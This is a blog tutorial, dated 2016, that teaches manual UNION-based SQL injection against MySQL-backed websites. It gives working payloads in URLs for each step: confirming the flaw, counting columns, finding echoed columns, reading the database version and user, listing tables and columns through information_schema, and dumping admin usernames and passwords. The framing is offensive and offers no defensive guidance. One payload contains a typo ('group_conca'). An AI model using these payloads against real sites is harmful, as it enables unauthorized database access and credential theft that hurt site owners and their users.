<!--
author: zhuoliang
head: http://pingodata.qiniudn.com/jockchou-avatar.jpg
date: 2016-07-29
title: Learn How To Hack Websites With Different Techniques
tags: SQL Injection, Hack
category: Hack
status: publish
-->

## SQL Injection in MySQL Databases ##

SQL Injection attacks are code injections that exploit the database layer of the application. This is most commonly the MySQL database, but there are techniques to carry out this attack in other databases such as Oracle. In this tutorial, i will be showing you the steps to carry out the attack on a MySQL Database.

![SQL Injection](http://i.imgur.com/E6N9NNf.jpg)


### 1. Find A Page Vulnerable###

When testing a website for SQL Injection vulnerabilities, you need to find a page that looks like this:

	www.site.com/page=1
	www.site.com/id=5

Basically, the site needs to have an = then a number or a string, but most commonly a number. Once you have found a page like this, we test for vulnerability by simply entering an ' after the number in the URL. For example:

	www.site.com/page=1'

If the database is vulnerable, the page will spit out a MySQL error such as:

	Warning: mysql_num_rows(): supplied argument is not a valid MySQL result 
			 resource in /home/wwwprof/public_html/readnews.php on line 29

If the page loads as normal then the database is not vulnerable, and the website is not vulnerable to SQL Injection.


### 2. Find The Number of Columns  ###

Now we need to find the number of union columns in the database. We do this using the `order by` command. We do this by entering `order by 1--`, `order by 2--` and so on until we receive a page error. For example:

    www.site.com/page=1 order by 1--
	http://www.site.com/page=1 order by 2--
	http://www.site.com/page=1 order by 3--
	http://www.site.com/page=1 order by 4--
	http://www.site.com/page=1 order by 5--

If we receive another MySQL error here, then that means we have 4 columns. If the site errored on `order by 9` then we would have 8 columns. If this does not work, instead of `--` after the number, change it with `/*`, as they are two difference prefixes and if one works the other tends not too. It just depends on the way the database is configured as to which prefix is used.

### 3. Find The Vulnerable Columns ###

We now are going to use the `union` command to find the vulnerable columns. So we enter after the URL, union all select (number of columns)--, for example:

	www.site.com/page=1 union all select 1,2,3,4--

This is what we would enter if we have 4 columns. If you have 7 columns you would put, `union all select 1,2,3,4,5,6,7--`. If this is done successfully the page should show a couple of numbers somewhere on the page. For example, 2 and 3. This means columns 2 and 3 are vulnerable.

### 4. Find The Database Version, Name and User ###

We now need to find the database version, name, and user. We do this by replacing the vulnerable column numbers with the following commands:

	user()
	database()
	version()

Or if these don't work try...

	@@user
	@@version
	@@database

For example the url would look like:

	www.site.com/page=1 union all select 1,user(),version(),4--

The resulting page would then show the database user and then the MySQL version. For example `admin@localhost and MySQL 5.0.83`.

**IMPORTANT:** If the version is 5 and above read on to carry out the attack, if it is 4 and below, you have to brute force or guess the table and column names, programs can be used to do this.

### 5. List All The Table Names ###

In this step, our aim is to list all the table names in the database. To do this we enter the following command after the URL.

	UNION SELECT 1,table_name,3,4 FROM information_schema.tables--

So the url would look like:
	
	www.site.com/page=1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables--

Remember the `table_name` goes in the vulnerable column number you found earlier. If this command is entered correctly, the page should show all the tables in the database, so look for tables that may contain useful information such as passwords, so look for admin tables or member or user tables.


### 6. List All The Column Names ###

In this Step we want to list all the column names in the database, to do this we use the following command:

	union all select 1,2,group_concat(column_name),4 from information_schema.columns where table_schema=database()--

So the URL would look like this:

	www.site.com/page=1 union all select 1,2,group_concat(column_name),4 from information_schema.columns where table_schema=database()--

This command makes the page spit out ALL the column names in the database. So again, look for interesting names such as user, email, and password.

### 7. Dump The Data ###

Finally, we need to dump the data, so say we want to get the `username` and `password` fields, from table "admin" we would use the following command:

	union all select 1,2,group_concat(username,0x3a,password),4 from admin--

So the URL would look like this:

	www.site.com/page=1 union all select 1,2,group_conca(username,0x3a,password),4 from admin--

Here the `concat` command matches up the username with the password so you don't have to guess, if this command is successful then you should be presented with a page full of usernames and passwords from the website
